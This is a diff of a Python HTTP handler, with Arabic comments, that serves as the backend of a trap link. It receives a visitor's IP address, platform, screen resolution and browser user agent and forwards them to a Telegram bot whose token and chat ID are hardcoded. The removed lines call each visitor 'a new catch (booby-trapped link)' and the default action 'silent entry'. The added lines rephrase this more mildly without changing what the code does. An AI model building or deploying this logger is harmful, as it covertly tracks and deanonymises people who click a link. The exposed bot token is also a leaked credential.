@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 import json
 import requests
 
-# معلوماتك اللي عطيتني إياها (جاهزة)
+# بياناتك الثابتة
 TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
 CHAT_ID = "5811700860"
 
@@ -14,27 +14,26 @@ class handler(BaseHTTPRequestHandler):
             data = json.loads(post_data.decode('utf-8'))
 
             device = data.get('device', {})
-            action_type = data.get('action', 'دخول صامت')
+            action_type = data.get('action', 'نشاط غير معروف')
 
-            # تنسيق الرسالة لتوصلك بشكل فخم في التليجرام
+            # تنسيق الرسالة اللي بتوصلك في التليجرام
             message = (
-                "⚠️ ** صيدة جديدة (رابط ملغم) ** ⚠️\n"
+                "🚨 ** تم رصد ضغطة على الرابط! ** 🚨\n"
                 "━━━━━━━━━━━━━━━\n"
                 f"📝 **النوع:** {action_type}\n"
-                f"🌐 **الـ IP الحقيقي:** `{device.get('ip', 'مخفي')}`\n"
-                f"📱 **نوع الجهاز:** {device.get('platform', 'N/A')}\n"
-                f"🖥 **دقة الشاشة:** {device.get('screen', 'N/A')}\n"
-                f"🔍 **المتصفح:** {device.get('userAgent')[:50]}...\n"
+                f"🌐 **الـ IP:** `{device.get('ip', 'N/A')}`\n"
+                f"📱 **الجهاز:** {device.get('platform', 'N/A')}\n"
+                f"🖥 **الشاشة:** {device.get('screen', 'N/A')}\n"
+                f"🔍 **المتصفح:** {device.get('userAgent')[:60]}...\n"
                 "━━━━━━━━━━━━━━━"
             )
 
-            # إرسال البيانات فوراً للبوت
+            # الإرسال للبوت
             requests.post(
                 f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                 data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
             )
 
-            # رد للسيرفر عشان ما يعلق
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
